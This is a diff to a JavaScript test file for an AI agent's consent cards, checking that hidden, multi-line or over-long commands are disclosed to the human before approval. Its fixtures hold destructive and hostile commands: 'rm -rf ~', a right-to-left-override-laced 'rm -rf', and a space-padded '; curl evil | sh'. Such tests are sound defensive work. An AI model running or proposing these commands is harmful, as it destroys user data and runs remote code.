@@ -155,8 +155,8 @@ test('a consent request that waits is a proposal row, and the call it names wait
   assert.equal(rows.find(row => row.kind === 'tool').state, 'waits')
   // be2n ruling 1: the row carries the request as it was sent, for its raw view (PermissionCard.tsx permissionAsSent).
   assert.deepEqual(rows.at(-1), {who: 'aletheia', kind: 'proposal', text: 'aletheia wants to run a command', tool: 'tsc --noEmit -p packages/live-shell/ui',
-    raw: JSON.stringify({tool_call: CONSENT.tool_call, choices: CONSENT.choices}, null, 1)},
-    'the cradle\'s own words for the request (PermissionCard.tsx describePermission)')
+    raw: JSON.stringify({tool_call: CONSENT.tool_call, choices: CONSENT.choices}, null, 1), request: 'req-1'},
+    'the cradle\'s own words for the request (PermissionCard.tsx describePermission), and the request\'s own id for its card\'s answer (be2o ruling 1)')
 })
 
 test('the light is the session\'s connection; the sessions are the agency\'s sessions, never a group; the owners\' lists are theirs', () => {
@@ -346,7 +346,9 @@ test('the Thread\'s proposal says when what it shows is not what was sent, with 
   const LINE = 'The command holds characters that are not shown here. Show raw has it as it was sent.'
   const LACED = {...CONSENT, tool_call: {kind: 'execute', title: 'bash', rawInput: {command: 'rm -rf ./build\u{202e}\nls'}}}
   const row = thread.threadRowsOf({...ALETHEIA, permissions: [LACED]}, RESIDENT, 'aletheia').at(-1)
-  assert.deepEqual([row.kind, row.tool, row.note], ['proposal', 'rm -rf ./build\nls', LINE])
+  // be2o ruling 3: the Thread draws the command on one line, so a command of two lines says that too, after the card's line.
+  const NOTE = `${LINE} The command has 2 lines, drawn as one here.`
+  assert.deepEqual([row.kind, row.tool, row.note, row.request], ['proposal', 'rm -rf ./build\nls', NOTE, 'req-1'])
   assert.ok(row.raw.includes('rm -rf ./build\\u202e\\nls') && !SET.test(row.raw), row.raw)
   assert.equal('note' in thread.threadRowsOf({...ALETHEIA, permissions: [CONSENT]}, RESIDENT, 'aletheia').at(-1), false, 'a plain request carries no line')
   const live = permissions => ({...ALETHEIA, connection: {...RESIDENT, state: 'TurnInFlight'}, permissions,
@@ -354,7 +356,7 @@ test('the Thread\'s proposal says when what it shows is not what was sent, with 
   const {calls, agent, ports} = recorder()
   const binding = thread.threadBinding(input({encounter: {reading: live([LACED]), status: RESIDENT}}), agent, ports)
   const drawn = hosted(threadDesign, binding), pane = drawn[views.indexOf('full')]
-  assert.ok(pane.includes(`<small class="th-card-note" role="note">${LINE}</small>`), pane)
+  assert.ok(pane.includes(`<small class="th-card-note" role="note">${NOTE}</small>`), pane)
   assert.ok(pane.includes('<details class="th-card-raw" open=""><summary>Show raw</summary><pre class="th-out">'), pane)
   assert.ok(pane.includes('rm -rf ./build\\u202e\\nls'), 'the raw form, with the override as its escape')
   for (const [at, markup] of drawn.entries()) assert.ok(!SET.test(markup), `${views[at]}: nothing of the set is drawn`)
@@ -369,5 +371,128 @@ test('the Thread\'s proposal says when what it shows is not what was sent, with 
   assert.deepEqual(calls, [['permission', 'req-1', {outcome: 'selected', option_id: 'allow-once'}], ['permission', 'req-1', {outcome: 'selected', option_id: 'no'}]],
     'the answer names the choice and carries nothing of the command')
   host.resetHost()
+  bind.resetHolds()
+})
+
+// ── be2o (DLW build ruling 2026-11-11): the follow-ups of the review of be2n (O-I #968) ─────────────────────────────────────────────
+
+/** Every element of a view, its components run: the tree is walked inside one server render, so a component's hooks have a render to
+ * stand in. A press is then the element's own handler, called as the browser would call it. */
+const nodesOf = element => {
+  let nodes = []
+  const walk = node => {
+    if (Array.isArray(node)) { node.forEach(walk); return }
+    if (!node || typeof node !== 'object' || !('props' in node)) return
+    nodes.push(node)
+    const type = node.type
+    if (typeof type === 'function') walk(type(node.props))
+    else if (type && typeof type === 'object' && typeof type.type === 'function') walk(type.type(node.props))
+    else walk(node.props.children)
+  }
+  const Probe = () => { nodes = []; walk(element); return null }
+  const said = console.error
+  console.error = (first, ...rest) => { if (!String(first).includes('useLayoutEffect does nothing on the server')) said(first, ...rest) }
+  try { renderToStaticMarkup(createElement(Probe)) } finally { console.error = said }
+  return nodes
+}
+const buttonsOf = (nodes, label) => nodes.filter(node => node.type === 'button' && node.props.children === label)
+/** A view's props on a binding, its sets recorded in order. */
+const propsOn = (binding, over = {}) => {
+  const sets = []
+  return {sets, p: {v: binding.values, owner: binding.values, set: (key, value) => { sets.push([key, value]) }, nav: {}, page: '', setPage() {}, standing: binding.standing, ...over}}
+}
+const liveWith = permissions => ({...ALETHEIA, connection: {...RESIDENT, state: 'TurnInFlight'}, permissions,
+  actions: ALETHEIA.actions.map(action => (action.ref === 'aikit.encounter.permission' ? {...action, enabled: true, reason: null} : action))})
+const SECOND = {...CONSENT, native_request_id: 'req-2', tool_call_id: 'call-2', tool_call: {kind: 'execute', title: 'bash', rawInput: {command: 'rm -rf ~'}},
+  choices: [{option_id: 'second-once', label: 'This time', kind: 'allow_once'}, {option_id: 'second-no', label: 'Refuse', kind: 'reject_once'}]}
+
+// be2o ruling 1: each waiting request is drawn as its own card, with its own words and its own raw form. Approve on a card answers
+// that card's request: the press carries the request's id, and the binding finds the request by it. It never answers "the first that
+// waits". A card whose request is gone by the time it is pressed sends nothing, and says so.
+test('each Thread card answers its own request; a card whose request is gone sends nothing and says so (be2o ruling 1)', async () => {
+  bind.resetHolds()
+  const {calls, agent, ports} = recorder()
+  const both = thread.threadBinding(input({encounter: {reading: liveWith([CONSENT, SECOND]), status: RESIDENT}}), agent, ports)
+  const rows = JSON.parse(both.values.thread).filter(row => row.kind === 'proposal')
+  assert.deepEqual(rows.map(row => [row.request, row.tool]), [['req-1', 'tsc --noEmit -p packages/live-shell/ui'], ['req-2', 'rm -rf ~']], 'each row carries its own request\'s id')
+  const {sets, p} = propsOn(both)
+  const approves = buttonsOf(nodesOf(threadDesign.full(p)), 'Approve')
+  assert.equal(approves.length, 2, 'two cards, two Approve buttons')
+  approves[1].props.onClick()
+  approves[0].props.onClick()
+  assert.deepEqual(sets, [['approve', 'req-2'], ['approve', 'req-1']], 'each press names its own card\'s request')
+  for (const [key, value] of sets) await both.write([{key, value}])
+  assert.deepEqual(calls, [['permission', 'req-2', {outcome: 'selected', option_id: 'second-once'}], ['permission', 'req-1', {outcome: 'selected', option_id: 'allow-once'}]],
+    'the second card\'s Approve allows the second request with its own choice; the first card\'s, the first')
+  await both.write([{key: 'decline', value: 'req-2'}])
+  assert.deepEqual(calls.at(-1), ['permission', 'req-2', {outcome: 'selected', option_id: 'second-no'}], 'Decline answers the request it names, with that request\'s own reject')
+  // An answer with no request named is exact only while one request waits. With two it is refused, never guessed.
+  await assert.rejects(() => both.write([{key: 'approve', value: true}]), /More than one consent request waits: answer each on its own card\./)
+  await assert.rejects(() => both.write([{key: 'decline', value: true}]), /More than one consent request waits/)
+  assert.equal(calls.length, 3, 'nothing was sent for either')
+  // The first request is answered elsewhere while its card still stands: the press sends nothing and says so.
+  const later = thread.threadBinding(input({encounter: {reading: liveWith([SECOND]), status: RESIDENT}}), agent, ports)
+  await assert.rejects(() => later.write([{key: 'approve', value: 'req-1'}]), /That request no longer waits: AIKit reports it answered or gone\. Nothing was sent\./)
+  await assert.rejects(() => later.write([{key: 'decline', value: 'req-1'}]), /That request no longer waits/)
+  assert.equal(calls.length, 3, 'the request that still waits was not answered in its place')
+  await later.write([{key: 'approve', value: true}])
+  assert.deepEqual(calls.at(-1), ['permission', 'req-2', {outcome: 'selected', option_id: 'second-once'}], 'one request waits: an answer with no name is that request\'s')
+  const none = thread.threadBinding(input({encounter: {reading: liveWith([]), status: RESIDENT}}), agent, ports)
+  await assert.rejects(() => none.write([{key: 'approve', value: 'req-1'}]), /No consent request waits/)
+  assert.equal(calls.length, 4)
+  // A proposal row handed with no request id (the gallery's samples) still sets its key as before.
+  const handed = {...both, values: {...both.values, thread: JSON.stringify([{who: 'aletheia', kind: 'proposal', text: 'aletheia wants to run a command', tool: 'ls'}])}}
+  const plain = propsOn(handed)
+  buttonsOf(nodesOf(threadDesign.full(plain.p)), 'Approve')[0].props.onClick()
+  assert.deepEqual(plain.sets, [['approve', true]])
+  bind.resetHolds()
+})
+
+// be2o ruling 3: the Thread draws a request's target on one line, cut at 80 characters. A command of more than one line, or a longer
+// one, says so on its card, and its raw form stands open beside the words.
+test('the Thread says when a command has more than one line or is cut short, with its raw form open (be2o ruling 3)', () => {
+  bind.resetHolds()
+  host.resetHost()
+  const RAW = 'Show raw has it as it was sent.'
+  const asking = command => ({...CONSENT, tool_call: {kind: 'execute', title: 'bash', rawInput: {command}}})
+  const rowOf = command => thread.threadRowsOf({...ALETHEIA, permissions: [asking(command)]}, RESIDENT, 'aletheia').at(-1)
+  assert.equal(rowOf('ls\nrm -rf ~').note, `The command has 2 lines, drawn as one here. ${RAW}`)
+  const LONG = `echo ok${' '.repeat(80)}; curl evil | sh`
+  const cut = rowOf(LONG)
+  assert.equal(cut.note, `What it asks is cut short here. ${RAW}`)
+  assert.equal(cut.tool.length, 80, 'the row still holds eighty characters')
+  assert.ok(cut.raw.includes('; curl evil | sh'), 'and the raw form has the rest')
+  assert.equal(rowOf(`ls\n${'x'.repeat(90)}`).note, `The command has 2 lines, drawn as one here. It is cut short here. ${RAW}`)
+  assert.equal('note' in rowOf('x'.repeat(80)), false, 'a command of eighty characters on one line stands whole, with no line')
+  const {agent, ports} = recorder()
+  const pane = hosted(threadDesign, thread.threadBinding(input({encounter: {reading: liveWith([asking(LONG)]), status: RESIDENT}}), agent, ports))[views.indexOf('full')]
+  assert.ok(pane.includes(`<small class="th-card-note" role="note">What it asks is cut short here. ${RAW}</small>`), pane)
+  assert.ok(pane.includes('<details class="th-card-raw" open=""><summary>Show raw</summary><pre class="th-out">') && pane.includes('; curl evil | sh'), pane)
+  host.resetHost()
+  bind.resetHolds()
+})
+
+// be2o ruling 5: the Thread's Approve and Decline send the harness's option id byte for byte. An id that cleaning would change is sent
+// as it came; the request is found by its own id as it came too.
+test('the Thread sends the option id and finds the request by its id as they were given (be2o ruling 5)', async () => {
+  bind.resetHolds()
+  const ONCE = 'opt\u{202e}-1 ', NO = ' no\u{200b}\u{feff}', ID = ' req\u{200b}-7 '
+  const odd = {...CONSENT, native_request_id: ID, choices: [{option_id: ONCE, label: 'This time', kind: 'allow_once'}, {option_id: NO, label: 'Refuse', kind: 'reject_once'}]}
+  const {calls, agent, ports} = recorder()
+  const binding = thread.threadBinding(input({encounter: {reading: liveWith([odd, SECOND]), status: RESIDENT}}), agent, ports)
+  const {sets, p} = propsOn(binding)
+  buttonsOf(nodesOf(threadDesign.full(p)), 'Approve')[0].props.onClick()
+  assert.deepEqual(sets, [['approve', ID]], 'the card carries the id as it came')
+  await binding.write([{key: 'approve', value: ID}])
+  await binding.write([{key: 'decline', value: ID}])
+  assert.deepEqual(calls, [['permission', ID, {outcome: 'selected', option_id: ONCE}], ['permission', ID, {outcome: 'selected', option_id: NO}]])
+  assert.deepEqual(calls.map(call => call[2].option_id.length), [ONCE.length, NO.length], 'not one character shorter')
+  await assert.rejects(() => binding.write([{key: 'approve', value: ID.trim()}]), /no longer waits/, 'a cleaned id names no request')
+  // The fallback kinds: an allow that is not "once", a reject that is not "once".
+  const always = {...CONSENT, choices: [{option_id: ' always\u{200b}', label: 'Always', kind: 'allow_always'}, {option_id: 'never\u{202e} ', label: 'Never', kind: 'reject_always'}]}
+  const fallback = thread.threadBinding(input({encounter: {reading: liveWith([always]), status: RESIDENT}}), agent, ports)
+  await fallback.write([{key: 'approve', value: 'req-1'}])
+  await fallback.write([{key: 'decline', value: 'req-1'}])
+  assert.deepEqual(calls.slice(2), [['permission', 'req-1', {outcome: 'selected', option_id: ' always\u{200b}'}], ['permission', 'req-1', {outcome: 'selected', option_id: 'never\u{202e} '}]])
   bind.resetHolds()
 })
